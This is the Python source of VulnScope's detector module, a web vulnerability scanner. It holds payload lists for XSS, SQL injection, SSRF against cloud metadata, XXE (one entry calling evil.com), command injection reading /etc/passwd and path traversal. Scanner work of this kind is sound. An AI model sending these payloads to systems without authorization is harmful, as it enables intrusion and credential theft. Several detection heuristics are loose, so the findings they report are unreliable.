"""
VulnScope - Vulnerability Detectors
Detectors for XSS, SQL Injection, SSRF, IDOR and other vulnerabilities
"""

import re
from abc import ABC, abstractmethod
from typing import List, Dict, Any, Optional
import requests

from ..core.models import Endpoint, Finding, Severity, VulnerabilityType, Status


class Detector(ABC):
    """Base class for vulnerability detectors"""
    
    @property
    @abstractmethod
    def vulnerability_type(self) -> VulnerabilityType:
        """Return the type of vulnerability this detector detects"""
        pass
    
    @property
    @abstractmethod
    def severity(self) -> Severity:
        """Return default severity for this vulnerability type"""
        pass
    
    @abstractmethod
    def detect(self, endpoint: Endpoint, session: requests.Session) -> List[Finding]:
        """
        Detect vulnerabilities in an endpoint
        
        Args:
            endpoint: Endpoint to test
            session: Authenticated session
            
        Returns:
            List of findings
        """
        pass
    
    def _create_finding(self, endpoint: Endpoint, title: str, 
                        description: str, evidence: Dict[str, Any]) -> Finding:
        """Create a standardized finding"""
        return Finding(
            scan_id="",
            target_id=endpoint.target_id,
            endpoint_id=str(endpoint.id),
            vulnerability_type=self.vulnerability_type,
            severity=self.severity,
            title=title,
            description=description,
            evidence=evidence,
            status=Status.PENDING,
        )


class XSSDetector(Detector):
    """Cross-Site Scripting (XSS) detector"""
    
    @property
    def vulnerability_type(self) -> VulnerabilityType:
        return VulnerabilityType.XSS
    
    @property
    def severity(self) -> Severity:
        return Severity.HIGH
    
    # XSS payloads
    PAYLOADS = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '"><script>alert(1)</script>',
        "'-alert(1)-'",
        '<body onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '<input onfocus=alert(1) autofocus>',
    ]
    
    # Reflection patterns
    REFLECTION_PATTERNS = [
        r'<script>.*?%s.*?</script>',
        r'on\w+\s*=\s*["\']?%s',
        r'eval\s*\(\s*["\']?%s',
        r'alert\s*\(\s*["\']?%s',
    ]
    
    def detect(self, endpoint: Endpoint, session: requests.Session) -> List[Finding]:
        """Detect XSS vulnerabilities"""
        findings = []
        
        for payload in self.PAYLOADS[:3]:  # Limit to first 3 for performance
            try:
                # Test the payload
                response = self._test_payload(endpoint, session, payload)
                
                if response and self._is_vulnerable(response.text, payload):
                    finding = self._create_finding(
                        endpoint=endpoint,
                        title=f"Cross-Site Scripting (XSS) - {payload[:20]}...",
                        description=f"Reflected XSS vulnerability detected. "
                                   f"The parameter reflects the input without proper sanitization.",
                        evidence={
                            'payload': payload,
                            'url': endpoint.url,
                            'method': endpoint.method,
                            'response_snippet': response.text[:500],
                        }
                    )
                    findings.append(finding)
                    break  # Found XSS, no need to test more payloads
                    
            except Exception:
                continue
        
        return findings
    
    def _test_payload(self, endpoint: Endpoint, session: requests.Session, 
                    payload: str) -> Optional[requests.Response]:
        """Test a single XSS payload"""
        try:
            # Build test URL with payload
            test_url = f"{endpoint.url}?test={payload}"
            response = session.get(test_url, timeout=30)
            return response
        except Exception:
            return None
    
    def _is_vulnerable(self, response_text: str, payload: str) -> bool:
        """Check if response indicates XSS vulnerability"""
        # Check if payload is reflected without encoding
        encoded_payload = payload.replace('<', '<').replace('>', '>')
        
        # If original payload appears in response (not encoded)
        if payload in response_text:
            return True
        
        # Check for common XSS indicators
        xss_indicators = [
            '<script',
            'onerror=',
            'onload=',
            'alert(',
            'eval(',
        ]
        
        for indicator in xss_indicators:
            if indicator in response_text.lower():
                return True
        
        return False


class SQLInjectionDetector(Detector):
    """SQL Injection detector"""
    
    @property
    def vulnerability_type(self) -> VulnerabilityType:
        return VulnerabilityType.SQL_INJECTION
    
    @property
    def severity(self) -> Severity:
        return Severity.CRITICAL
    
    # SQL Injection payloads
    PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin'--",
        "1' ORDER BY 1--",
        "1' UNION SELECT NULL--",
        "1' AND '1'='1",
        "' OR 1=1--",
    ]
    
    # Error patterns indicating SQL injection
    ERROR_PATTERNS = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"PostgreSQL.*ERROR",
        r"Warning.*pg_",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"Driver.*SQL[-_ ]*Server",
        r"OLE DB.*SQL Server",
        r"SQLServer JDBC Driver",
        r"Microsoft SQL Native Client error",
        r"ODBC SQL Server Driver",
        r"SQLite/JDBCDriver",
        r"System.Data.SQLite.SQLiteException",
    ]
    
    def detect(self, endpoint: Endpoint, session: requests.Session) -> List[Finding]:
        """Detect SQL injection vulnerabilities"""
        findings = []
        
        # Get baseline response
        baseline_response = self._get_baseline(endpoint, session)
        if not baseline_response:
            return findings
        
        for payload in self.PAYLOADS:
            try:
                response = self._test_payload(endpoint, session, payload)
                
                if response and self._is_vulnerable(response, baseline_response):
                    finding = self._create_finding(
                        endpoint=endpoint,
                        title=f"SQL Injection - {payload[:20]}...",
                        description=f"SQL injection vulnerability detected. "
                                   f"User input is concatenated directly into SQL query.",
                        evidence={
                            'payload': payload,
                            'url': endpoint.url,
                            'method': endpoint.method,
                            'status_code': response.status_code,
                            'response_snippet': response.text[:500] if response.text else "",
                        }
                    )
                    findings.append(finding)
                    break
                    
            except Exception:
                continue
        
        return findings
    
    def _get_baseline(self, endpoint: Endpoint, session: requests.Session) -> Optional[requests.Response]:
        """Get baseline response without injection"""
        try:
            response = session.get(endpoint.url, timeout=30)
            return response
        except Exception:
            return None
    
    def _test_payload(self, endpoint: Endpoint, session: requests.Session,
                    payload: str) -> Optional[requests.Response]:
        """Test a single SQL injection payload"""
        try:
            test_url = f"{endpoint.url}?id={payload}"
            response = session.get(test_url, timeout=30)
            return response
        except Exception:
            return None
    
    def _is_vulnerable(self, response: requests.Response, 
                      baseline: requests.Response) -> bool:
        """Check if response indicates SQL injection"""
        # Check for SQL error messages
        response_text = response.text.lower()
        
        for pattern in self.ERROR_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        # Check for significant differences from baseline
        if baseline and response:
            # Different content length might indicate injection
            len_diff = abs(len(response.text) - len(baseline.text))
            if len_diff > 1000:
                return True
            
            # Different status code
            if response.status_code != baseline.status_code:
                return True
        
        return False


class SSRDetector(Detector):
    """Server-Side Request Forgery (SSRF) detector"""
    
    @property
    def vulnerability_type(self) -> VulnerabilityType:
        return VulnerabilityType.SSRF
    
    @property
    def severity(self) -> Severity:
        return Severity.HIGH
    
    # SSRF payloads
    PAYLOADS = [
        'http://localhost/',
        'http://127.0.0.1/',
        'http://[::1]/',
        'http://metadata.google.internal/',
        'http://169.254.169.254/',
        'file:///etc/passwd',
        'dict://localhost:11211/stats',
        'gopher://127.0.0.1:6379/_INFO',
    ]
    
    def detect(self, endpoint: Endpoint, session: requests.Session) -> List[Finding]:
        """Detect SSRF vulnerabilities"""
        findings = []
        
        for payload in self.PAYLOADS:
            try:
                response = self._test_payload(endpoint, session, payload)
                
                if response and self._is_vulnerable(response):
                    finding = self._create_finding(
                        endpoint=endpoint,
                        title=f"Server-Side Request Forgery (SSRF) - {payload}",
                        description=f"SSRF vulnerability detected. "
                                   f"The application makes requests to user-controlled URLs.",
                        evidence={
                            'payload': payload,
                            'url': endpoint.url,
                            'method': endpoint.method,
                            'status_code': response.status_code,
                            'response_snippet': response.text[:500] if response.text else "",
                        }
                    )
                    findings.append(finding)
                    break
                    
            except Exception:
                continue
        
        return findings
    
    def _test_payload(self, endpoint: Endpoint, session: requests.Session,
                    payload: str) -> Optional[requests.Response]:
        """Test a single SSRF payload"""
        try:
            test_url = f"{endpoint.url}?url={payload}&redirect={payload}&next={payload}&data={payload}"
            response = session.get(test_url, timeout=30, allow_redirects=False)
            return response
        except Exception:
            return None
    
    def _is_vulnerable(self, response: requests.Response) -> bool:
        """Check if response indicates SSRF"""
        if not response:
            return False
        
        # Check for indicators in response
        indicators = [
            'localhost',
            '127.0.0.1',
            'metadata',
            'aws',
            'root:',
            '/etc/passwd',
        ]
        
        response_text = response.text.lower()
        for indicator in indicators:
            if indicator in response_text:
                return True
        
        # Check for internal ports
        if response.status_code in [200, 201] and len(response.text) < 1000:
            return True
        
        return False


class IDORDetector(Detector):
    """Insecure Direct Object Reference (IDOR) detector"""
    
    @property
    def vulnerability_type(self) -> VulnerabilityType:
        return VulnerabilityType.IDOR
    
    @property
    def severity(self) -> Severity:
        return Severity.MEDIUM
    
    def detect(self, endpoint: Endpoint, session: requests.Session) -> List[Finding]:
        """Detect IDOR vulnerabilities"""
        findings = []
        
        # Check if endpoint has numeric or UUID parameters
        if not endpoint.parameters:
            return findings
        
        # Test for IDOR by modifying parameter values
        for param in endpoint.parameters:
            param_name = param.get('name')
            if not param_name:
                continue
            
            # Try to access with different IDs
            test_ids = ['1', '2', '999', '0', '-1', 'admin']
            
            for test_id in test_ids:
                try:
                    response = self._test_idor(endpoint, session, param_name, test_id)
                    
                    if response and self._is_vulnerable(response):
                        finding = self._create_finding(
                            endpoint=endpoint,
                            title=f"Insecure Direct Object Reference (IDOR) - {param_name}",
                            description=f"IDOR vulnerability detected. "
                                       f"The application does not properly authorize access to objects.",
                            evidence={
                                'parameter': param_name,
                                'test_value': test_id,
                                'url': endpoint.url,
                                'method': endpoint.method,
                                'status_code': response.status_code,
                            }
                        )
                        findings.append(finding)
                        break
                        
                except Exception:
                    continue
        
        return findings
    
    def _test_idor(self, endpoint: Endpoint, session: requests.Session,
                  param_name: str, param_value: str) -> Optional[requests.Response]:
        """Test for IDOR by changing parameter value"""
        try:
            test_url = f"{endpoint.url}?{param_name}={param_value}"
            response = session.get(test_url, timeout=30)
            return response
        except Exception:
            return None
    
    def _is_vulnerable(self, response: requests.Response) -> bool:
        """Check if response indicates IDOR"""
        if not response:
            return False
        
        # IDOR typically returns 200 OK for unauthorized access
        if response.status_code == 200:
            # Check for sensitive data indicators
            sensitive_patterns = [
                r'"email":\s*"[^"]+"',
                r'"password":\s*"[^"]+"',
                r'"username":\s*"[^"]+"',
                r'"phone":\s*"[^"]+"',
                r'"address":\s*"[^"]+"',
                r'"ssn":\s*"[^"]+"',
                r'"credit_card":\s*"[^"]+"',
            ]
            
            for pattern in sensitive_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    return True
        
        return False


class AuthBypassDetector(Detector):
    """Authentication bypass detector"""
    
    @property
    def vulnerability_type(self) -> VulnerabilityType:
        return VulnerabilityType.AUTH_BYPASS
    
    @property
    def severity(self) -> Severity:
        return Severity.CRITICAL
    
    # Common authentication bypass payloads
    PAYLOADS = [
        '../..',
        '..;/..',
        '....//....//',
        '%2e%2e%2f',
        '%2e%2e/',
        '..%252f',
    ]
    
    def detect(self, endpoint: Endpoint, session: requests.Session) -> List[Finding]:
        """Detect authentication bypass vulnerabilities"""
        findings = []
        
        for payload in self.PAYLOADS:
            try:
                response = self._test_payload(endpoint, session, payload)
                
                if response and response.status_code in [200, 201, 204]:
                    # Check if we got access to protected resource
                    if self._is_vulnerable(response):
                        finding = self._create_finding(
                            endpoint=endpoint,
                            title=f"Authentication Bypass - Path Traversal",
                            description=f"Authentication bypass vulnerability detected.",
                            evidence={
                                'payload': payload,
                                'url': endpoint.url,
                                'status_code': response.status_code,
                            }
                        )
                        findings.append(finding)
                        break
                        
            except Exception:
                continue
        
        return findings
    
    def _test_payload(self, endpoint: Endpoint, session: requests.Session,
                    payload: str) -> Optional[requests.Response]:
        """Test authentication bypass"""
        try:
            test_url = f"{endpoint.url}/{payload}"
            response = session.get(test_url, timeout=30)
            return response
        except Exception:
            return None
    
    def _is_vulnerable(self, response: requests.Response) -> bool:
        """Check if response indicates auth bypass"""
        # Check for access granted
        if response.status_code in [200, 201, 204]:
            return True
        return False


class CSRFDetector(Detector):
    """Cross-Site Request Forgery (CSRF) detector"""
    
    @property
    def vulnerability_type(self) -> VulnerabilityType:
        return VulnerabilityType.CSRF
    
    @property
    def severity(self) -> Severity:
        return Severity.HIGH
    
    def detect(self, endpoint: Endpoint, session: requests.Session) -> List[Finding]:
        """Detect CSRF vulnerabilities"""
        findings = []
        
        # Only check POST, PUT, DELETE methods
        if endpoint.method not in ['POST', 'PUT', 'DELETE', 'PATCH']:
            return findings
        
        # Check if CSRF token is present in forms
        csrf_indicators = ['csrf', 'xsrf', 'token', 'authenticity']
        
        # Check for missing CSRF protection
        if endpoint.has_body:
            # Check if form has CSRF token
            if endpoint.body:
                has_csrf = any(indicator in endpoint.body.lower() for indicator in csrf_indicators)
                if not has_csrf:
                    finding = self._create_finding(
                        endpoint=endpoint,
                        title="Potential CSRF Vulnerability",
                        description="Form submission without apparent CSRF token protection.",
                        evidence={
                            'url': endpoint.url,
                            'method': endpoint.method,
                            'body': endpoint.body[:200] if endpoint.body else "",
                        }
                    )
                    findings.append(finding)
        
        # Check if SameSite cookie header is missing
        try:
            response = session.get(endpoint.url, timeout=30)
            set_cookie = response.headers.get('Set-Cookie', '')
            if 'samesite' not in set_cookie.lower() and 'secure' not in set_cookie.lower():
                finding = self._create_finding(
                    endpoint=endpoint,
                    title="Missing SameSite Cookie Attribute",
                    description="Cookies set without SameSite attribute may be vulnerable to CSRF.",
                    evidence={
                        'url': endpoint.url,
                        'set_cookie': set_cookie[:200],
                    }
                )
                findings.append(finding)
        except Exception:
            pass
        
        return findings


class XXEDetector(Detector):
    """XML External Entity (XXE) detector"""
    
    @property
    def vulnerability_type(self) -> VulnerabilityType:
        return VulnerabilityType.XXE
    
    @property
    def severity(self) -> Severity:
        return Severity.HIGH
    
    # XXE payloads
    PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "file:///etc/passwd">%dtd;]>',
    ]
    
    def detect(self, endpoint: Endpoint, session: requests.Session) -> List[Finding]:
        """Detect XXE vulnerabilities"""
        findings = []
        
        # Only test endpoints that accept XML
        content_types = ['application/xml', 'text/xml', 'application/x-www-form-urlencoded']
        
        for payload in self.PAYLOADS:
            try:
                response = session.post(
                    endpoint.url,
                    data=payload,
                    headers={'Content-Type': 'application/xml'},
                    timeout=30
                )
                
                if self._is_vulnerable(response, payload):
                    finding = self._create_finding(
                        endpoint=endpoint,
                        title="XML External Entity (XXE) Vulnerability",
                        description="Application parses XML input without disabling external entities.",
                        evidence={
                            'payload': payload,
                            'url': endpoint.url,
                            'method': endpoint.method,
                            'status_code': response.status_code,
                            'response_snippet': response.text[:500] if response.text else "",
                        }
                    )
                    findings.append(finding)
                    break
                    
            except Exception:
                continue
        
        return findings
    
    def _is_vulnerable(self, response: requests.Response, payload: str) -> bool:
        """Check if response indicates XXE vulnerability"""
        indicators = ['root:', '/etc/passwd', 'bin/bash', 'daemon:', 'www-data:']
        response_text = response.text.lower()
        
        for indicator in indicators:
            if indicator in response_text:
                return True
        
        # Check for XXE error messages
        xxe_errors = ['entity', 'extern', 'dtd', 'xmlparse', 'simplexml']
        for error in xxe_errors:
            if error in response_text:
                return True
        
        return False


class CommandInjectionDetector(Detector):
    """Command Injection detector"""
    
    @property
    def vulnerability_type(self) -> VulnerabilityType:
        return VulnerabilityType.COMMAND_INJECTION
    
    @property
    def severity(self) -> Severity:
        return Severity.CRITICAL
    
    # Command injection payloads
    PAYLOADS = [
        '; ls -la',
        '| ls -la',
        '`ls -la`',
        '$(ls -la)',
        '\nls -la',
        '; cat /etc/passwd',
        '| cat /etc/passwd',
        '&& whoami',
        '|| whoami',
        '%; whoami',
    ]
    
    def detect(self, endpoint: Endpoint, session: requests.Session) -> List[Finding]:
        """Detect command injection vulnerabilities"""
        findings = []
        
        for payload in self.PAYLOADS:
            try:
                test_url = f"{endpoint.url}?cmd={payload}"
                response = session.get(test_url, timeout=30)
                
                if self._is_vulnerable(response, payload):
                    finding = self._create_finding(
                        endpoint=endpoint,
                        title=f"Command Injection - {payload[:15]}...",
                        description="Application may be vulnerable to command injection.",
                        evidence={
                            'payload': payload,
                            'url': endpoint.url,
                            'status_code': response.status_code,
                            'response_snippet': response.text[:500] if response.text else "",
                        }
                    )
                    findings.append(finding)
                    break
                    
            except Exception:
                continue
        
        return findings
    
    def _is_vulnerable(self, response: requests.Response, payload: str) -> bool:
        """Check if response indicates command injection"""
        indicators = ['root:', 'bin/bash', 'daemon:', 'www-data:', 'total ', 'drwx']
        
        for indicator in indicators:
            if indicator in response.text:
                return True
        
        return False


class SSTIDetector(Detector):
    """Server-Side Template Injection (SSTI) detector"""
    
    @property
    def vulnerability_type(self) -> VulnerabilityType:
        return VulnerabilityType.SECURITY_MISCONFIGURATION
    
    @property
    def severity(self) -> Severity:
        return Severity.CRITICAL
    
    # SSTI payloads for different template engines
    PAYLOADS = {
        'jinja2': '{{7*7}}',
        'erb': '<%= 7*7 %>',
        'twig': '{{7*7}}',
        'handlebars': '{{7*7}}',
        'smarty': '{7*7}',
        'velocity': '#set($x=7*7)$x',
    }
    
    def detect(self, endpoint: Endpoint, session: requests.Session) -> List[Finding]:
        """Detect Server-Side Template Injection vulnerabilities"""
        findings = []
        
        for engine, payload in self.PAYLOADS.items():
            try:
                test_url = f"{endpoint.url}?q={payload}"
                response = session.get(test_url, timeout=30)
                
                if self._is_vulnerable(response, payload):
                    finding = self._create_finding(
                        endpoint=endpoint,
                        title=f"Server-Side Template Injection (SSTI) - {engine}",
                        description=f"Application may be vulnerable to SSTI using {engine} template engine.",
                        evidence={
                            'payload': payload,
                            'engine': engine,
                            'url': endpoint.url,
                            'response_snippet': response.text[:500] if response.text else "",
                        }
                    )
                    findings.append(finding)
                    break
                    
            except Exception:
                continue
        
        return findings
    
    def _is_vulnerable(self, response: requests.Response, payload: str) -> bool:
        """Check if response indicates SSTI"""
        # Check if payload was evaluated
        if '49' in response.text:
            return True
        
        # Check for template error messages
        error_patterns = [
            'jinja2', 'template', 'tpl', 'smarty', 'velocity', 'freemarker',
            'thymeleaf', 'handlebars', 'mustache', 'twig'
        ]
        
        response_lower = response.text.lower()
        for pattern in error_patterns:
            if pattern in response_lower and 'error' in response_lower:
                return True
        
        return False


class DeserializationDetector(Detector):
    """Insecure Deserialization detector"""
    
    @property
    def vulnerability_type(self) -> VulnerabilityType:
        return VulnerabilityType.INSECURE_DESERIALIZATION
    
    @property
    def severity(self) -> Severity:
        return Severity.CRITICAL
    
    # Deserialization payloads
    PAYLOADS = {
        'python': 'pickle.loads',
        'java': 'java.io.ObjectInputStream',
        'php': 'unserialize',
        'ruby': 'Marshal.load',
        'net': 'BinaryFormatter',
    }
    
    def detect(self, endpoint: Endpoint, session: requests.Session) -> List[Finding]:
        """Detect Insecure Deserialization vulnerabilities"""
        findings = []
        
        # Check for serialized objects in responses
        try:
            response = session.get(endpoint.url, timeout=30)
            
            # Check response headers
            content_type = response.headers.get('Content-Type', '').lower()
            
            # Check for serialization indicators
            serialized_indicators = [
                'application/x-java-serialized-object',
                'application/x-python-pickle',
                'application/x-ruby-marshaled-object',
                'application/x-net',
            ]
            
            for indicator in serialized_indicators:
                if indicator in content_type:
                    finding = self._create_finding(
                        endpoint=endpoint,
                        title="Insecure Deserialization - Serialization Header Detected",
                        description="Application returns serialized objects which may be vulnerable to deserialization attacks.",
                        evidence={
                            'content_type': content_type,
                            'url': endpoint.url,
                        }
                    )
                    findings.append(finding)
                    break
            
            # Check for base64 encoded serialized data
            if endpoint.body:
                import base64
                try:
                    decoded = base64.b64decode(endpoint.body)
                    if b'serialized' in decoded.lower() or b'object' in decoded.lower():
                        finding = self._create_finding(
                            endpoint=endpoint,
                            title="Potential Insecure Deserialization",
                            description="Request body may contain serialized data.",
                            evidence={
                                'url': endpoint.url,
                                'method': endpoint.method,
                            }
                        )
                        findings.append(finding)
                except Exception:
                    pass
                    
        except Exception:
            pass
        
        return findings


class PathTraversalDetector(Detector):
    """Path Traversal / Local File Inclusion detector"""
    
    @property
    def vulnerability_type(self) -> VulnerabilityType:
        return VulnerabilityType.PATH_TRAVERSAL
    
    @property
    def severity(self) -> Severity:
        return Severity.HIGH
    
    # Path traversal payloads
    PAYLOADS = [
        '../../../../etc/passwd',
        '../../../../../../../../etc/passwd',
        '..%2f..%2f..%2f..%2fetc%2fpasswd',
        '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '....//....//....//....//etc/passwd',
        '..;/..;/..;/..;/etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
    ]
    
    def detect(self, endpoint: Endpoint, session: requests.Session) -> List[Finding]:
        """Detect Path Traversal vulnerabilities"""
        findings = []
        
        # Common parameter names for file paths
        file_params = ['file', 'path', 'page', 'template', 'include', 'doc', 'img', 'source']
        
        for param in endpoint.parameters:
            param_name = param.get('name', '').lower()
            
            # Check if parameter might be used for file access
            if any(fp in param_name for fp in file_params):
                for payload in self.PAYLOADS:
                    try:
                        test_url = f"{endpoint.url}?{param_name}={payload}"
                        response = session.get(test_url, timeout=30)
                        
                        if self._is_vulnerable(response, payload):
                            finding = self._create_finding(
                                endpoint=endpoint,
                                title=f"Path Traversal - {param_name}",
                                description="Application is vulnerable to path traversal attacks.",
                                evidence={
                                    'parameter': param_name,
                                    'payload': payload,
                                    'url': endpoint.url,
                                    'status_code': response.status_code,
                                    'response_snippet': response.text[:500] if response.text else "",
                                }
                            )
                            findings.append(finding)
                            break
                            
                    except Exception:
                        continue
        
        return findings
    
    def _is_vulnerable(self, response: requests.Response, payload: str) -> bool:
        """Check if response indicates path traversal"""
        indicators = [
            'root:', 'daemon:', 'www-data:', 'bin:', 'sys:',
            '[drivers]', 'windows', 'system32'
        ]
        
        for indicator in indicators:
            if indicator in response.text:
                return True
        
        # Check for path traversal error messages
        if 'no such file' in response.text.lower() or 'permission denied' in response.text.lower():
            return True
        
        return False
